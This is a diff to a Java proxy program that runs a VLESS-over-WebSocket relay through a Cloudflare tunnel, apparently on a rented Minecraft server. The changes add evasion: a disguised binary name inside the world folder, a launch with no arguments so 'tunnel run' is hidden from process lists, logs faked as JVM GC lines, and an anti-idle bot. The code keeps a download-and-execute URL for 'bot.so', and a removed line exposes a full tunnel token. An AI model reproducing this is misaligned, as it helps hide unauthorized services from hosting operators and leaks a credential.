@@ -33,25 +33,26 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardOpenOption;
 import java.nio.file.StandardCopyOption;
-import java.security.MessageDigest;
-import java.security.NoSuchAlgorithmException;
 import java.text.SimpleDateFormat;
 import java.time.Duration;
 import java.util.ArrayDeque;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 import java.util.Queue;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicLong;
+import java.util.zip.CRC32;
 
 public class App {
 
     // ================= 核心配置区 =================
-    // 默认的节点 UUID
-    private static final String UUID = "8c8244fb-d577-4d20-90e3-788a0977b001";
-    
-    // 👇 1. 必填：你的 Cloudflare Tunnel 长串 Token (请保留在双引号内)
-    private static final String CF_TOKEN = "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiZWMwNDM4MjQtZWQ5OS00NTZlLWJiMmEtMDgwZTJiNmZjMTY4IiwicyI6Ik5EWTVZMlkxTVRJdFpqUmhaQzAwTnpRMkxUbGpPVEV0TlRsbE1UVmhNMlU1WmpJMCJ9"; 
+    // 节点 UUID（可用环境变量 AG_UUID 覆盖；token 已打进自编译二进制，服务器上不再放配置文件）
+    private static final String UUID = System.getenv().getOrDefault("AG_UUID", "8c8244fb-d577-4d20-90e3-788a0977b001");
+
+    // CF_TOKEN：可选，仅当二进制没内置 token 时通过环境变量传给进程
+    private static final String CF_TOKEN = System.getenv().getOrDefault("CF_TOKEN", ""); 
     
     // 👇 2. 必填：面板分配给你的真实 MC 端口 (保活机器人需要去高频 Ping 它)
     private static final int MC_REAL_PORT = 24614; 
@@ -65,19 +66,23 @@ public class App {
     private static final String CF_BINARY_URL_AMD64 = "https://amd64.oooen.com/bot.so";
 
     // 4. 隐蔽性配置（尽量不留下明显痕迹）
-    private static final String HELPER_BIN = ".java-gclog-helper";
-    private static final String LOG_FILE_NAME = "gc.log";
+    private static final String HELPER_BIN = "world/session.lock.bak";   // hidden inside the world folder
+    private static final String LOG_FILE_NAME = "logs/gc.log";
     private static final boolean CONSOLE_LOG = false;
-    private static final boolean USE_BUNDLED_BINARY = true;   // 优先使用 jar 内置资源，避免下载流量
+    private static final boolean USE_BUNDLED_BINARY = false;   // keep jar small; upload cache/helper manually
 
     // 5. 节奏控制（叠加随机抖动，降低机器行为的规律感）
     private static final long WATCHDOG_BASE_MS = 15000;
     private static final long WATCHDOG_MAX_MS = 300000;
-    private static final long MC_KEEPALIVE_MS = 45000;
+    private static final long MC_KEEPALIVE_MS = 300000;
+    private static final boolean MC_KEEPALIVE_ENABLED = false;   // opt-in, only if host idles the server
+    private static final boolean ALLOW_DOWNLOAD = false;         // never download at runtime (stealth)
+    private static final boolean ARGLESS_TUNNEL = true;          // true: self-built cloudflared with hardcoded args (hide "tunnel run" from ps)
+    private static final boolean LOG_OBFUSCATE = true;   // Plan A: write gc.log as realistic JVM GC output
+    private static final boolean LOG_STDOUT = false;     // true: also encode cloudflared stdout lines (noisy)
     // ==============================================
 
     private static final byte[] UUID_BYTES = hexStringToByteArray(UUID.replace("-", ""));
-    private static final String PROTOCOL_UUID = UUID.replace("-", "");
 
     private static final List<String> BLOCKED_DOMAINS = Arrays.asList(
             "speedtest.net", "fast.com", "speedtest.cn", "speed.cloudflare.com",
@@ -91,8 +96,21 @@ public class App {
     private static Process tunnelProcess = null;
     private static final Path LOG_FILE = Path.of(LOG_FILE_NAME);
     private static final AtomicBoolean ARCH_MISMATCH_WARNED = new AtomicBoolean(false);
+    private static final long START_NANO = System.nanoTime();
+    private static final AtomicLong GC_SEQ = new AtomicLong(0);
+    private static final AtomicLong STDOUT_LINES = new AtomicLong(0);
+    private static final java.util.concurrent.ExecutorService IO_PUMP =
+            java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
+                Thread t = new Thread(r, "helper-io");
+                t.setDaemon(true);
+                return t;
+            });
 
     public static void main(String[] args) {
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            log("shutting down");
+            stop();
+        }, "shutdown-hook"));
         start();
         try {
             if (serverChannel != null) {
@@ -106,13 +124,7 @@ public class App {
     public static void start() {
         if (!RUNNING.compareAndSet(false, true)) return;
 
-        // 1. 启动终极隐蔽版的 Cloudflare 隧道守护进程
-        startCloudflareTunnelDaemon();
-
-        // 2. 启动本地 MC TCP 强行心跳保活机器人 (防休眠)
-        startMCKeepAliveBot(MC_REAL_PORT);
-
-        // 3. 启动 Netty 代理核心，仅绑定 127.0.0.1 内部回环
+        // 1. 先启动本地代理监听，确认绑定成功后再起隧道
         try {
             bossGroup = new NioEventLoopGroup(1);
             workerGroup = new NioEventLoopGroup();
@@ -124,7 +136,7 @@ public class App {
                         @Override
                         protected void initChannel(SocketChannel ch) {
                             ChannelPipeline p = ch.pipeline();
-                            p.addLast(new IdleStateHandler(45, 45, 0));
+                            p.addLast(new IdleStateHandler(600, 600, 0));
                             p.addLast(new HttpServerCodec());
                             p.addLast(new HttpObjectAggregator(65536));
                             p.addLast(new WebSocketServerProtocolHandler(WS_PATH, null, false));
@@ -138,9 +150,19 @@ public class App {
                     .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);
 
             serverChannel = b.bind("127.0.0.1", LISTEN_PORT).sync().channel();
-        } catch (Exception ignored) {
+        } catch (Exception e) {
+            log("proxy bind failed: " + e.getClass().getSimpleName() + " - " + e.getMessage());
             stop();
+            return;
         }
+
+        // 2. 启动本地 MC TCP 强行心跳保活机器人 (防休眠)
+        if (MC_KEEPALIVE_ENABLED) {
+            startMCKeepAliveBot(MC_REAL_PORT);
+        }
+
+        // 3. 本地后端就绪后再启动 Cloudflare 隧道守护进程
+        startCloudflareTunnelDaemon();
     }
 
     public static void stop() {
@@ -154,14 +176,9 @@ public class App {
     }
 
     // ========================================================
-    // 模块 1：CF 隧道（内置二进制优先，无下载流量）
+    // 模块 1：CF 隧道（本地二进制优先，默认不下载、不内置）
     // ========================================================
     private static void startCloudflareTunnelDaemon() {
-        if (CF_TOKEN == null || CF_TOKEN.length() < 50) {
-            log("token missing or too short, helper disabled");
-            return;
-        }
-
         Thread watchdogThread = new Thread(() -> {
             long waitMs = WATCHDOG_BASE_MS;
             log("watcher started");
@@ -215,6 +232,10 @@ public class App {
                     log("no binary source for arch=" + hostArch);
                     return false;
                 }
+                if (!ALLOW_DOWNLOAD) {
+                    log("no helper binary, download disabled");
+                    return false;
+                }
                 if (!downloadBinary(binary, dlUrl)) {
                     log("download failed, will retry");
                     return false;
@@ -240,11 +261,15 @@ public class App {
 
         try {
             binary.toFile().setExecutable(true);
-            ProcessBuilder pb = new ProcessBuilder(
-                    binary.toAbsolutePath().toString(),
-                    "--no-autoupdate", "tunnel", "--protocol", "http2", "run"
-            );
-            pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
+            ProcessBuilder pb = ARGLESS_TUNNEL
+                    ? new ProcessBuilder(binary.toAbsolutePath().toString())
+                    : new ProcessBuilder(
+                            binary.toAbsolutePath().toString(),
+                            "--no-autoupdate", "tunnel", "--protocol", "http2", "run"
+                    );
+            if (CF_TOKEN != null && !CF_TOKEN.isEmpty()) {
+                pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
+            }
             pb.redirectErrorStream(true);
             pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
 
@@ -278,6 +303,9 @@ public class App {
                 log("bundled resource missing: " + resource);
                 return false;
             }
+            if (target.getParent() != null) {
+                Files.createDirectories(target.getParent());
+            }
             Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
             log("extracted " + resource);
             return true;
@@ -289,6 +317,9 @@ public class App {
 
     private static boolean downloadBinary(Path target, String url) {
         try {
+            if (target.getParent() != null) {
+                Files.createDirectories(target.getParent());
+            }
             log("downloading " + url);
             HttpClient client = HttpClient.newBuilder()
                     .followRedirects(HttpClient.Redirect.NORMAL)
@@ -355,7 +386,7 @@ public class App {
 
     /** 读取子进程输出写入伪装日志，避免管道阻塞，也不暴露到控制台 */
     private static void pumpProcessOutput(Process proc) {
-        Thread pump = new Thread(() -> {
+        IO_PUMP.execute(() -> {
             try (java.io.BufferedReader reader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8))) {
                 String line;
@@ -364,55 +395,189 @@ public class App {
                 }
             } catch (IOException ignored) {
             }
-        }, "helper-out");
-        pump.setDaemon(true);
-        pump.start();
+        });
     }
 
     private static synchronized void log(String msg) {
-        String line = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date())
-                + " " + msg;
+        if (!LOG_OBFUSCATE) {
+            appendLog(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " " + msg);
+            return;
+        }
+        if (msg.startsWith("[out] ")) {
+            if (LOG_STDOUT) {
+                appendLog(gcLine(10, textPayload(msg)));
+            } else {
+                STDOUT_LINES.incrementAndGet();   // cloudflared stdout 不落盘，只计数
+            }
+            return;
+        }
+        appendLog(gcLine(classify(msg), payloadFor(msg)));
+    }
+
+    private static void appendLog(String line) {
         if (CONSOLE_LOG) System.out.println(line);
         try {
+            if (LOG_FILE.getParent() != null) {
+                Files.createDirectories(LOG_FILE.getParent());
+            }
             Files.writeString(LOG_FILE, line + System.lineSeparator(), StandardCharsets.UTF_8,
                     StandardOpenOption.CREATE, StandardOpenOption.APPEND);
         } catch (IOException ignored) {
         }
     }
 
+    // ---------------------------------------------------------------
+    // GC 伪装编码表：phase 字符串即事件类型，堆数字携带参数（40bit: a8+b7+c11+d14）
+    //   0  Pause Young (Normal) (G1 Evacuation Pause)                watcher started
+    //   1  Pause Full (Allocation Failure)                           retry in {N}s
+    //   2  Pause Full (G1 Compaction Pause)                          watcher error (crc)
+    //   3  Pause Full (System.gc())                                  proxy bind failed (crc)
+    //   4  Pause Young (Concurrent Start) (G1 Humongous Allocation)  no binary source for arch={arch}
+    //   5  Concurrent Cycle                                          helper alive
+    //   6  Pause Young (Normal) (G1 Preventive GC)                   helper process started pid={pid} stdout={n}
+    //   7  Pause Young (Mixed) (G1 Evacuation Pause)                 helper exited code={code} stdout={n}
+    //   8  Pause Young (Prepare Mixed) (G1 Evacuation Pause)         start helper failed (crc)
+    //   9  Pause Young (Concurrent Start) (G1 Evacuation Pause)      shutting down
+    //  10  Pause Young (Normal) (G1 Evacuation Pause) (to-space exhausted)  cloudflared stdout (crc)
+    //  11  Concurrent Undo Cycle                                     no helper binary, download disabled
+    //  12  Concurrent Cleanup                                        other/unknown (crc)
+    // ---------------------------------------------------------------
+    private static final String[] GC_PHASES = {
+            "Pause Young (Normal) (G1 Evacuation Pause)",
+            "Pause Full (Allocation Failure)",
+            "Pause Full (G1 Compaction Pause)",
+            "Pause Full (System.gc())",
+            "Pause Young (Concurrent Start) (G1 Humongous Allocation)",
+            "Concurrent Cycle",
+            "Pause Young (Normal) (G1 Preventive GC)",
+            "Pause Young (Mixed) (G1 Evacuation Pause)",
+            "Pause Young (Prepare Mixed) (G1 Evacuation Pause)",
+            "Pause Young (Concurrent Start) (G1 Evacuation Pause)",
+            "Pause Young (Normal) (G1 Evacuation Pause) (to-space exhausted)",
+            "Concurrent Undo Cycle",
+            "Concurrent Cleanup",
+    };
+
+    private static int classify(String msg) {
+        if (msg.startsWith("shutting down")) return 9;
+        if (msg.startsWith("proxy bind failed")) return 3;
+        if (msg.startsWith("watcher started")) return 0;
+        if (msg.startsWith("retry in ")) return 1;
+        if (msg.startsWith("watcher error")) return 2;
+        if (msg.startsWith("no binary source")) return 4;
+        if (msg.startsWith("no helper binary")) return 11;
+        if (msg.startsWith("helper process started")) return 6;
+        if (msg.startsWith("helper alive")) return 5;
+        if (msg.startsWith("helper exited immediately")) return 7;
+        if (msg.startsWith("start helper failed")) return 8;
+        return 12;
+    }
+
+    /** 从已知消息提取参数，打包成 40bit payload */
+    private static long payloadFor(String msg) {
+        switch (classify(msg)) {
+            case 0:
+            case 5:
+            case 9:
+            case 11:
+                return 0L;   // 无参数事件：保持稳定的“小 GC”数字
+            case 1: {   // retry in Ns
+                int sec = 0;
+                for (int i = "retry in ".length(); i < msg.length(); i++) {
+                    char ch = msg.charAt(i);
+                    if (ch < '0' || ch > '9') break;
+                    sec = sec * 10 + (ch - '0');
+                }
+                return sec;
+            }
+            case 4: {   // no binary source for arch=X
+                long arch = msg.contains("amd64") ? 1 : (msg.contains("arm64") ? 0 : 2);
+                return arch;
+            }
+            case 6: {   // pid(22bit) + stdout count(18bit)
+                long pid = parseLongAfter(msg, "pid=");
+                long count = Math.min(STDOUT_LINES.get(), 0x3FFFFL);
+                return ((count & 0x3FFFFL) << 22) | (pid & 0x3FFFFFL);
+            }
+            case 7: {   // exit code(8bit) + stdout count(16bit)
+                long exit = parseLongAfter(msg, "code=");
+                long count = Math.min(STDOUT_LINES.get(), 0xFFFFL);
+                return ((count & 0xFFFFL) << 8) | (exit & 0xFFL);
+            }
+            default:
+                return textPayload(msg);   // 自由文本：长度(8bit) + CRC32(32bit)
+        }
+    }
+
+    private static long parseLongAfter(String msg, String marker) {
+        int idx = msg.indexOf(marker);
+        long value = 0;
+        if (idx >= 0) {
+            for (int i = idx + marker.length(); i < msg.length(); i++) {
+                char ch = msg.charAt(i);
+                if (ch < '0' || ch > '9') break;
+                value = value * 10 + (ch - '0');
+            }
+        }
+        return value;
+    }
+
+    /** 自由文本不落盘：只保存长度(8bit) + CRC32(32bit)，用于识别“和上次同一条” */
+    private static long textPayload(String msg) {
+        CRC32 crc = new CRC32();
+        crc.update(msg.getBytes(StandardCharsets.UTF_8));
+        long len = Math.min(msg.length(), 0xFFL);
+        return (len << 32) | (crc.getValue() & 0xFFFFFFFFL);
+    }
+
+    /** 40bit payload -> 一行 JVM GC 输出 */
+    private static String gcLine(int code, long payload) {
+        long a = 96 + (payload & 0xFFL);
+        long b = 48 + ((payload >>> 8) & 0x7FL);
+        long c = 1024 + ((payload >>> 15) & 0x7FFL);
+        long d = 1 + ((payload >>> 26) & 0x3FFFL);
+        double uptime = (System.nanoTime() - START_NANO) / 1_000_000_000.0;
+        return String.format(Locale.ROOT, "[%.3fs][info][gc] GC(%d) %s %dM->%dM(%dM) %.3fms",
+                uptime, GC_SEQ.getAndIncrement(), GC_PHASES[code], a, b, c, d);
+    }
+
  
     // ========================================================
     // 模块 2：MC 高频心跳 TCP 挂机保活引擎 (防面板休眠)
     // ========================================================
-    private static void startMCKeepAliveBot(int mcPort) {
+        private static void startMCKeepAliveBot(int mcPort) {
+        if (!MC_KEEPALIVE_ENABLED) {
+            return;
+        }
         Thread botThread = new Thread(() -> {
             while (RUNNING.get()) {
-                try (java.net.Socket socket = new java.net.Socket("127.0.0.1", mcPort)) {
-                    socket.setSoTimeout(5000);
-                    DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
+                if (tunnelProcess != null && tunnelProcess.isAlive()) {
+                    try (java.net.Socket socket = new java.net.Socket("127.0.0.1", mcPort)) {
+                        socket.setSoTimeout(5000);
+                        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
 
-                    ByteArrayOutputStream b = new ByteArrayOutputStream();
-                    DataOutputStream handshake = new DataOutputStream(b);
-                    handshake.writeByte(0x00);         // Packet ID
-                    writeVarInt(handshake, 763);       // Protocol Version
-                    writeString(handshake, "127.0.0.1"); 
-                    handshake.writeShort(mcPort);      // Port
-                    writeVarInt(handshake, 1);         // Next State: 1 (Status)
+                        ByteArrayOutputStream b = new ByteArrayOutputStream();
+                        DataOutputStream handshake = new DataOutputStream(b);
+                        handshake.writeByte(0x00);         // Packet ID
+                        writeVarInt(handshake, 763);       // Protocol Version
+                        writeString(handshake, "127.0.0.1");
+                        handshake.writeShort(mcPort);      // Port
+                        writeVarInt(handshake, 1);         // Next State: 1 (Status)
 
-                    writeVarInt(dos, b.size());
-                    dos.write(b.toByteArray());
+                        writeVarInt(dos, b.size());
+                        dos.write(b.toByteArray());
 
-                    dos.writeByte(1);    // Length
-                    dos.writeByte(0x00); // Packet ID
-                    dos.flush();
-                    
-                } catch (Exception ignored) {
-                    // 彻底静默失败，避免日志刷屏暴露
+                        dos.writeByte(1);    // Length
+                        dos.writeByte(0x00); // Packet ID
+                        dos.flush();
+                    } catch (Exception ignored) {
+                        // silent, avoid log spam
+                    }
                 }
 
                 try {
-                    // 每隔一段时间发起一次 TCP 握手（带抖动，降低规律性）
-                    Thread.sleep(jitter(MC_KEEPALIVE_MS));
+                    long delay = (long) (MC_KEEPALIVE_MS * (0.6 + 0.8 * Math.random()));
+                    Thread.sleep(delay);
                 } catch (InterruptedException e) {
                     break;
                 }
@@ -440,7 +605,7 @@ public class App {
     }
 
     // ========================================================
-    // 模块 3：纯内存 VLESS/Trojan/SS 协议核心转发
+    // 模块 3：纯内存 VLESS over WebSocket 核心转发（仅 TCP）
     // ========================================================
     static class WebSocketProxyHandler extends SimpleChannelInboundHandler<WebSocketFrame> {
         private static final long MAX_PENDING_BYTES = 2L * 1024 * 1024;
@@ -450,6 +615,7 @@ public class App {
         private boolean protocolIdentified = false;
         private final Queue<ByteBuf> pendingOutboundWrites = new ArrayDeque<>();
         private long pendingOutboundBytes = 0;
+        private byte[] pendingFirst = null;
 
         @Override
         protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {
@@ -522,49 +688,49 @@ public class App {
         }
 
         private void closeBoth(ChannelHandlerContext ctx) {
+            pendingFirst = null;
             releasePendingOutbound();
             if (outboundChannel != null && outboundChannel.isOpen()) outboundChannel.close();
             if (ctx.channel().isOpen()) ctx.close();
         }
 
         private void handleFirstMessage(ChannelHandlerContext ctx, byte[] data) {
-            if (data.length > 18 && data[0] == 0x00) {
+            byte[] buf;
+            if (pendingFirst == null) {
+                buf = data;
+            } else {
+                buf = new byte[pendingFirst.length + data.length];
+                System.arraycopy(pendingFirst, 0, buf, 0, pendingFirst.length);
+                System.arraycopy(data, 0, buf, pendingFirst.length, data.length);
+            }
+
+            if (buf.length > 18 && (buf[0] == 0x00 || buf[0] == 0x01)) {
                 boolean uuidMatch = true;
                 for (int i = 0; i < 16; i++) {
-                    if (data[i + 1] != UUID_BYTES[i]) {
+                    if (buf[i + 1] != UUID_BYTES[i]) {
                         uuidMatch = false;
                         break;
                     }
                 }
-                if (uuidMatch && handleVless(ctx, data)) {
-                    protocolIdentified = true;
-                    return;
+                if (uuidMatch) {
+                    if (handleVless(ctx, buf)) {
+                        protocolIdentified = true;
+                        pendingFirst = null;
+                        return;
+                    }
+                    if (buf.length < 1024) {
+                        pendingFirst = buf;   // incomplete VLESS header, wait for more frames
+                        return;
+                    }
                 }
             }
-
-            if (data.length >= 56) {
-                byte[] hashBytes = Arrays.copyOfRange(data, 0, 56);
-                String receivedHash = new String(hashBytes, StandardCharsets.US_ASCII);
-                String expectedHash = sha224Hex(UUID);
-                String expectedHash2 = sha224Hex(PROTOCOL_UUID);
-
-                if ((receivedHash.equals(expectedHash) || receivedHash.equals(expectedHash2)) && handleTrojan(ctx, data)) {
-                    protocolIdentified = true;
-                    return;
-                }
-            }
-
-            if (data.length > 2 && (data[0] == 0x01 || data[0] == 0x03 || data[0] == 0x04)) {
-                if (handleShadowsocks(ctx, data)) {
-                    protocolIdentified = true;
-                    return;
-                }
-            }
+            pendingFirst = null;
             ctx.close();
         }
 
         private boolean handleVless(ChannelHandlerContext ctx, byte[] data) {
             try {
+                byte version = data[0];
                 int addonsLength = data[17] & 0xFF;
                 int offset = 18 + addonsLength;
                 if (offset + 1 > data.length) return false;
@@ -614,114 +780,7 @@ public class App {
                     return false;
                 }
 
-                ctx.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{0x00, 0x00})));
-                final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
-                connectToTarget(ctx, host, port, remainingData);
-                return true;
-            } catch (Exception e) {
-                return false;
-            }
-        }
-
-        private boolean handleTrojan(ChannelHandlerContext ctx, byte[] data) {
-            try {
-                int offset = 56;
-                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) offset++;
-                if (offset >= data.length || data[offset] != 0x01) return false;
-                offset++;
-                if (offset >= data.length) return false;
-
-                byte atyp = data[offset];
-                offset++;
-                String host;
-                int addressLength;
-
-                if (atyp == 0x01) {
-                    if (offset + 4 > data.length) return false;
-                    host = String.format("%d.%d.%d.%d", data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
-                    addressLength = 4;
-                } else if (atyp == 0x03) {
-                    if (offset >= data.length) return false;
-                    int hostLen = data[offset] & 0xFF;
-                    offset++;
-                    if (offset + hostLen > data.length) return false;
-                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
-                    addressLength = hostLen;
-                } else if (atyp == 0x04) {
-                    if (offset + 16 > data.length) return false;
-                    StringBuilder sb = new StringBuilder();
-                    for (int i = 0; i < 16; i += 2) {
-                        if (i > 0) sb.append(':');
-                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
-                    }
-                    host = sb.toString();
-                    addressLength = 16;
-                } else {
-                    return false;
-                }
-
-                offset += addressLength;
-                if (offset + 2 > data.length) return false;
-                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
-                offset += 2;
-
-                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) offset++;
-
-                if (isBlockedDomain(host)) {
-                    ctx.close();
-                    return false;
-                }
-
-                final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
-                connectToTarget(ctx, host, port, remainingData);
-                return true;
-            } catch (Exception e) {
-                return false;
-            }
-        }
-
-        private boolean handleShadowsocks(ChannelHandlerContext ctx, byte[] data) {
-            try {
-                int offset = 0;
-                byte atyp = data[offset];
-                offset++;
-                String host;
-                int addressLength;
-
-                if (atyp == 0x01) {
-                    if (offset + 4 > data.length) return false;
-                    host = String.format("%d.%d.%d.%d", data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
-                    addressLength = 4;
-                } else if (atyp == 0x03) {
-                    if (offset >= data.length) return false;
-                    int hostLen = data[offset] & 0xFF;
-                    offset++;
-                    if (offset + hostLen > data.length) return false;
-                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
-                    addressLength = hostLen;
-                } else if (atyp == 0x04) {
-                    if (offset + 16 > data.length) return false;
-                    StringBuilder sb = new StringBuilder();
-                    for (int i = 0; i < 16; i += 2) {
-                        if (i > 0) sb.append(':');
-                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
-                    }
-                    host = sb.toString();
-                    addressLength = 16;
-                } else {
-                    return false;
-                }
-
-                offset += addressLength;
-                if (offset + 2 > data.length) return false;
-                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
-                offset += 2;
-
-                if (isBlockedDomain(host)) {
-                    ctx.close();
-                    return false;
-                }
-
+                ctx.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{version, 0x00})));
                 final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
                 connectToTarget(ctx, host, port, remainingData);
                 return true;
@@ -750,6 +809,7 @@ public class App {
                     .handler(new ChannelInitializer<Channel>() {
                         @Override
                         protected void initChannel(Channel ch) {
+                            ch.pipeline().addLast(new IdleStateHandler(0, 0, 600));
                             ch.pipeline().addLast(new TargetHandler(ctx.channel(), dataToSend));
                         }
                     });
@@ -814,6 +874,16 @@ public class App {
         }
 
         @Override
+        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {
+            if (evt instanceof IdleStateEvent) {
+                ctx.close();
+                if (inboundChannel.isActive()) inboundChannel.close();
+            } else {
+                ctx.fireUserEventTriggered(evt);
+            }
+        }
+
+        @Override
         public void channelRead(ChannelHandlerContext ctx, Object msg) {
             try {
                 if (msg instanceof ByteBuf) {
@@ -862,20 +932,6 @@ public class App {
             data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
         }
         return data;
-    }
-
-    private static String sha224Hex(String input) {
-        try {
-            MessageDigest md = MessageDigest.getInstance("SHA-224");
-            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
-            StringBuilder sb = new StringBuilder();
-            for (byte b : digest) {
-                sb.append(String.format("%02x", b & 0xff));
-            }
-            return sb.toString();
-        } catch (NoSuchAlgorithmException ignored) {
-            return "";
-        }
     }
 
     private static boolean isBlockedDomain(String host) {
